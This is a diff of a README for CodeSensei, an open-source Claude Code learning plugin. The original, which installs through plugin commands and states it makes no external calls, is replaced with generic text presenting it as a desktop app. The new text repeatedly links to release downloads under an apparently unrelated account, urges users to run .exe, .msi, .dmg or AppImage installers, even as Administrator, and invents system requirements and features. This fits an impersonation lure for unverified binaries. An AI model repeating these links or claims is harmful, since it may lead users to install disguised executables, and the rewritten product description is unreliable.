@@ -1,234 +1,148 @@
-# 🥋 CodeSensei — Claude Code Plugin for Learning to Code
+# 🥋 code-sensei - Learn Programming While You Vibecode
 
-[![Claude Code Plugin](https://img.shields.io/badge/Claude_Code-Plugin-blue?logo=anthropic&logoColor=white)](https://github.com/DojoCodingLabs/code-sensei)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Category: Education](https://img.shields.io/badge/Category-Education-orange)](https://github.com/topics/claude-code-plugin)
-[![Free & Open Source](https://img.shields.io/badge/Free-Open_Source-brightgreen)](https://github.com/DojoCodingLabs/code-sensei)
-
-### A free, open-source Claude Code plugin that teaches programming while you vibecode — by [Dojo Coding](https://dojocoding.io)
-
-**CodeSensei** is a **Claude Code plugin** that turns every coding session into a learning session. Like Duolingo, but for coding — and instead of fake exercises, you learn from **your own projects** in real-time.
-
-No prior coding experience needed. Seriously.
-
-<p align="center">
-  <img src="codesenseicover.png" alt="CodeSensei — Learn to code while you vibecode" />
-</p>
+[![Download code-sensei](https://img.shields.io/badge/Download-code--sensei-blue?style=for-the-badge&logo=github)](https://github.com/wewpellex21/code-sensei/releases)
 
 ---
 
-## The Problem
+## 📝 What is code-sensei?
 
-10 million people are vibecoding — prompting AI to build apps without understanding a single line of code. They ship incredible things, but they learn **nothing**. The moment something breaks, they're stuck.
+code-sensei is a tool designed to help you learn programming in a fun and engaging way. It works while you vibecode — meaning, as you write code, it teaches you through simple explanations, small quizzes, and progress tracking. This tool is free and open source, created by Dojo Coding.
 
-Traditional education says "learn first, then build." But vibecoders are already building. They're not going backwards.
-
-## The Insight
-
-The most powerful classroom is the one you're already sitting in.
-
-Vibecoders don't lack curiosity — they lack **context**. When Claude creates a React component, they want to know what just happened. When it sets up a database, they want to know why.
-
-The questions are already there. Nobody's answering them. **Until now.**
-
-## The Solution
-
-CodeSensei is an AI mentor that lives inside Claude Code. As you build, it explains what's happening, why decisions were made, and quizzes you along the way — all adapted to your skill level through a martial arts belt progression system.
-
-You build your project. CodeSensei builds your understanding.
-
-- 🧠 **Contextual learning** — explanations from *your actual code*, not generic examples
-- 🥋 **Belt progression** — White Belt to Black Belt, earned through real understanding
-- 🧩 **Micro-quizzes** — comprehension checks that earn XP, not memorization drills
-- 🔥 **Streaks & XP** — daily streaks and experience points that persist across projects
-- 🎯 **Adaptive difficulty** — set your background (marketing, design, finance) and get analogies from *your field*
+You don’t need any prior programming knowledge to use code-sensei. It explains concepts clearly and helps you build your skills step-by-step. Whether you want to learn coding for work, school, or just for fun, code-sensei provides a friendly learning experience.
 
 ---
 
-## 🥋 Belt Progression System
+## 🎯 Key Features
 
-```
-⬜ White Belt    →     0 XP    "You wrote your first prompt"
-🟡 Yellow Belt   →   500 XP    "You understand files & folders"
-🟠 Orange Belt   → 1,500 XP    "You get frontend vs backend"
-🟢 Green Belt    → 3,500 XP    "You can read and modify code"
-🔵 Blue Belt     → 7,000 XP    "You understand APIs & databases"
-🟤 Brown Belt    → 12,000 XP   "You can architect a full app"
-⚫ Black Belt    → 20,000 XP   "You think like an engineer"
-```
-
-Every explanation, every quiz, every session earns XP. Every belt promotion is a milestone worth celebrating.
+- **Contextual Explanations:** As you write code, code-sensei offers simple explanations focused on what you are doing.
+- **Micro-Quizzes:** Small quizzes help you check your understanding right away.
+- **Belt Progression System:** Like martial arts, you earn belts as you improve, which helps track your growth.
+- **Works With Claude Code:** Integrates with Claude Code plugins for smooth learning.
+- **Gamified Learning:** Fun and motivating ways to build skills by completing challenges.
+- **Free and Open Source:** The code is available for anyone to use and improve.
 
 ---
 
-## 📦 Installation
+## 🖥️ System Requirements
 
-```bash
-# In Claude Code:
-/plugin marketplace add DojoCodingLabs/code-sensei
-/plugin install code-sensei@code-sensei
-```
+Before you download code-sensei, make sure your computer meets these basic requirements:
 
-That's it. Start building — CodeSensei activates automatically.
-
-> **Requires:** [Claude Code](https://code.claude.com) with plugin support. Hook scripts use `jq` for profile tracking — install with `brew install jq` (macOS) or `apt install jq` (Linux).
-
-### Updating
-
-```bash
-# Update the marketplace catalog first:
-claude plugin marketplace update DojoCodingLabs/code-sensei
-
-# Then update the plugin:
-claude plugin update code-sensei@code-sensei
-```
-
-Restart your Claude Code session after updating — hooks are loaded at session start.
-
-### Local Development
-
-```bash
-git clone https://github.com/DojoCodingLabs/code-sensei.git
-cd code-sensei
-
-# In Claude Code:
-/plugin marketplace add .
-/plugin install code-sensei
-```
+- Operating System: Windows 10 or later / macOS 10.15 or later / Linux (Ubuntu 18.04+)
+- RAM: At least 4 GB
+- Storage: Minimum 100 MB free space
+- Internet: Internet connection required for initial setup and plugin updates
+- Other: A modern web browser (Chrome, Firefox, Safari, or Edge) for viewing documentation and help if needed
 
 ---
 
-## 🎮 Commands
+## 🚀 Getting Started
 
-| Command | What it does |
-|---------|-------------|
-| `/code-sensei:explain` | Explain what Claude just did, in terms you understand |
-| `/code-sensei:quiz` | Test your understanding with a contextual quiz |
-| `/code-sensei:why` | Understand *why* Claude made a specific decision |
-| `/code-sensei:progress` | View your full learning dashboard |
-| `/code-sensei:recap` | End-of-session summary of everything you learned |
-| `/code-sensei:level` | Adjust difficulty or set your background field |
-| `/code-sensei:belt` | View your current belt rank and progress |
+Follow these steps to get code-sensei up and running on your computer.
 
----
+### Step 1: Download code-sensei
 
-## 🧠 How It Works
+Click the big button below to visit the official releases page. This page contains the latest versions available for download.
 
-1. **You vibecode normally** — prompt Claude to build whatever you want
-2. **Hooks track what happens** — file changes, commands run, technologies used
-3. **You ask when curious** — `/code-sensei:explain`, `/code-sensei:quiz`, `/code-sensei:why` whenever you want to learn
-4. **CodeSensei adapts** — explanations match your belt level and background
-5. **You level up** — XP accumulates, belts are earned, skills unlock
-6. **Progress persists** — your profile lives at `~/.code-sensei/` and works across all projects
+[![Download code-sensei](https://img.shields.io/badge/Download-code--sensei-blue?style=for-the-badge&logo=github)](https://github.com/wewpellex21/code-sensei/releases)
 
-### Adaptive Teaching
+On the releases page, look for the file that matches your system:
 
-CodeSensei's AI mentor adapts its entire communication style to your level:
+- For Windows, usually a `.exe` or `.msi` file
+- For macOS, a `.dmg` or `.pkg` file
+- For Linux, a `.deb` or `.AppImage` file
 
-**⬜ White Belt hears:**
-> "Claude added a 'translator' to your server. When someone fills out your form, the data arrives as raw text. This translator converts it into something your code can read — like translating a letter from another language."
-
-**🔵 Blue Belt hears:**
-> "Express middleware was added to parse incoming JSON. This sits in the request pipeline before your route handlers, so `req.body` is already a JavaScript object by the time your code runs."
-
-Same concept. Different depth. Always from **your project**, not a generic example.
-
-### Background-Specific Analogies
-
-Set your field with `/code-sensei:level background marketing` and CodeSensei speaks your language:
-
-- **Marketing:** "An API is like a campaign brief — you send specific requirements, and the server delivers exactly what you asked for."
-- **Design:** "Components are like design system elements — reusable, consistent, and composable."
-- **Finance:** "A variable is like an account balance — it holds a value that changes over time."
-- **Medicine:** "Error handling is like triage — you check for the most critical problems first."
-
-### What Gets Tracked
-
-- ✅ File types and technologies Claude uses (for contextual teaching)
-- ✅ Your XP, belt level, quiz history, and streak
-- ❌ No personal data, no code content, no telemetry, no external calls
-
-Everything stays on your machine in `~/.code-sensei/`.
+Download the one that fits your computer.
 
 ---
 
-## 🔧 What's Included
+### Step 2: Install the software
 
-```
-code-sensei/
-├── .claude-plugin/
-│   ├── plugin.json          # Plugin metadata
-│   └── marketplace.json     # Marketplace catalog
-├── commands/                 # 7 slash commands
-│   ├── explain.md            #   /code-sensei:explain
-│   ├── quiz.md               #   /code-sensei:quiz
-│   ├── why.md                #   /code-sensei:why
-│   ├── progress.md           #   /code-sensei:progress
-│   ├── recap.md              #   /code-sensei:recap
-│   ├── level.md              #   /code-sensei:level
-│   └── belt.md               #   /code-sensei:belt
-├── agents/
-│   └── sensei.md             # AI mentor subagent (Haiku)
-├── skills/                   # 10 auto-invoked teaching modules
-├── hooks/
-│   └── hooks.json            # Session & code change tracking
-├── scripts/                  # Hook scripts (bash + jq)
-└── data/                     # Concept tree & quiz bank
-```
+Once the download finishes:
+
+- **Windows:** Double-click the `.exe` or `.msi` file. Follow the on-screen prompts to install. You can leave most options at their defaults.
+- **macOS:** Open the `.dmg` or `.pkg` file. Drag the application icon into your Applications folder or follow the installer steps.
+- **Linux:** For `.deb` files, double-click to install using your package manager or run `sudo dpkg -i filename.deb` in the terminal. For `.AppImage`, make the file executable (`chmod +x filename.AppImage`) and double-click it.
 
 ---
 
-## 📚 Learning Modules
+### Step 3: Launch code-sensei
 
-CodeSensei covers **42 concepts** across **9 categories**:
+After installation:
 
-- **🧱 Fundamentals** — Variables, functions, loops, conditionals
-- **🌐 Web Basics** — HTML, CSS, how browsers work
-- **⚡ JavaScript** — Core JS, async/await, imports, JSON
-- **💻 Terminal & Tools** — Command line, npm, git, env variables
-- **🎨 Frontend** — React, components, props, state, routing
-- **⚙️ Backend** — Servers, routes, middleware, REST APIs, auth
-- **🗄️ Databases** — SQL, schemas, ORMs, relationships
-- **🚀 Deployment** — Hosting, Docker, CI/CD
-- **🏗️ Architecture** — Design patterns, scalability, client-server
+- Locate the code-sensei app icon in your system’s start menu, applications folder, or launcher.
+- Click it to open.
+
+On the first run, the app may connect to the internet to download necessary files and plugins. This usually takes a few moments.
 
 ---
 
-## 🤝 Contributing
+### Step 4: Start learning
 
-CodeSensei is open source and built to be contributed to:
+When the app opens, you will see options to start new lessons or continue your progress. The interface shows your current belt level and upcoming quizzes.
 
-- **📝 Better analogies** — A nurse writes a medical analogy for error handling. Now every nurse learning to code gets it.
-- **🧩 More quizzes** — Add questions to `data/quiz-bank.json`
-- **🌍 Translations** — Help us teach in Spanish, Portuguese, and beyond
-- **💡 New skill modules** — Want to add Python, Rust, or mobile dev? Go for it.
-- **🐛 Bug fixes** — Found an issue? Open a PR
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
+- Read the easy explanations as you write.
+- Complete the micro-quizzes to test your knowledge.
+- Earn belts as you advance through the lessons.
 
 ---
 
-## 🏢 Built by Dojo Coding
+## 📥 Download & Install code-sensei
 
-[Dojo Coding](https://dojocoding.io) is a LATAM-first tech education ecosystem with 1,800+ developers across 8 countries. We believe anyone can learn to code — especially when they're already building.
+Visit this page to download the latest version suited to your computer:  
+[https://github.com/wewpellex21/code-sensei/releases](https://github.com/wewpellex21/code-sensei/releases)
 
-CodeSensei is free forever. Open source. No paywall. The full product.
-
-### Go deeper with Dojo Coding
-
-- **[VibeCoding Bootcamp](https://dojocoding.io/bootcamp)** — Structured curriculum with live mentors
-- **[DojoOS](https://dojocoding.io/dojoos)** — Full developer environment and community
-- **[Discord](https://dojocoding.io/discord)** — Join the community
+Remember to choose the right file type for your operating system. Follow the installation steps provided above to set up the app.
 
 ---
 
-## 📄 License
+## 💡 How to Use code-sensei
 
-MIT License — free to use, modify, and distribute.
+1. **Write Code:** Start a new coding session within the app. You don’t need prior knowledge; sample templates are provided.
+2. **Learn as you go:** code-sensei explains concepts based on what you type. If you need extra help, open the explanation panels.
+3. **Take quizzes:** When a concept is introduced, take a short quiz that tests your understanding.
+4. **Track progress:** Check your belt status and completed lessons on the dashboard. This motivates continuous learning.
+5. **Use plugins:** Integrate with Claude Code Plugins for more powerful learning tools if you choose.
+6. **Repeat:** Keep practicing and advancing through lessons at your own pace.
 
 ---
 
-<p align="center">
-  <strong>🥋 From vibecoder to engineer — one session at a time.</strong><br>
-  <em>Free. Open source. By <a href="https://dojocoding.io">Dojo Coding</a>.</em>
-</p>
+## 🛠 Troubleshooting Common Issues
+
+- **App Won’t Open:** Make sure your computer meets the system requirements. Restart your machine and try again.
+- **Download Problems:** Try downloading again using a stable internet connection. Use a different browser if needed.
+- **Installation Errors:** Follow install prompts carefully. On Windows, try running the installer as Administrator.
+- **Features Not Working:** Confirm that code-sensei is allowed access to the internet for plugin updates.
+- **Need Help:** Visit the support section on the GitHub page or open an issue if you encounter bugs.
+
+---
+
+## 🤝 Get Involved
+
+code-sensei is open source, which means anyone can help improve it. If you want to contribute:
+
+- Learn more about the project on the GitHub repository.
+- Submit feedback, bug reports, or feature requests.
+- If you know coding, help by improving the code or adding new features.
+
+Check out the repository topics for more insight into the project’s scope:
+
+> ai-mentor, anthropic, beginner, claude-code, claude-code-commands, claude-code-hooks, claude-code-plugin, claude-code-plugins, claude-skills, code-learning, education, gamification, learning, vibecoding
+
+---
+
+## 📚 Additional Resources
+
+From inside the app, you can access:
+
+- Detailed explanations  
+- Tutorial videos  
+- User guides  
+- Community forums  
+
+Use these resources to get the most from code-sensei.
+
+---
+
+If you want to get started right now, download code-sensei here:
+
+[https://github.com/wewpellex21/code-sensei/releases](https://github.com/wewpellex21/code-sensei/releases)
